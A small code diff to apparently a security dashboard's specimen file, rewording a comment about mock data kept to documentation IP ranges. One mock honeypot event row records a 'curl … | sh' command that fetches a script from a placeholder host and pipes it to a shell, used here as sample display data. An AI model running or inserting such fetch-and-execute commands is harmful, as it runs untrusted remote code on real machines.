@@ -71,7 +71,8 @@ export type SpecimenGroup = { title: string; specimens: Specimen[] }
 
 const noop = () => {}
 
-// Mock data in documentation ranges only (RFC 5737, example.test).
+// Specimen data, written inline: documentation ranges only (RFC 5737,
+// example.test), never the dashboard's data layer.
 type EventRow = { id: string; time: string; severity: string; sensor: string; source: string; detail: string }
 const EVENTS: EventRow[] = [
   { id: '1', time: '14:02', severity: 'high', sensor: 'cowrie', source: '198.51.100.13', detail: 'curl -s http://203.0.113.251/x | sh' },
